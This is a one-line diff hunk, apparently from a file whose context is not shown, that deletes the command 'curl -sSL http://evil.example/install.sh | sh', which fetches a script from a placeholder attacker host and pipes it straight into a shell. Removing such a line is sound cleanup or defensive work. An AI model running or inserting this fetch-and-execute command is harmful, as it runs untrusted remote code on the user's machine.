@@ -1,1 +1,0 @@
-curl -sSL http://evil.example/install.sh | sh
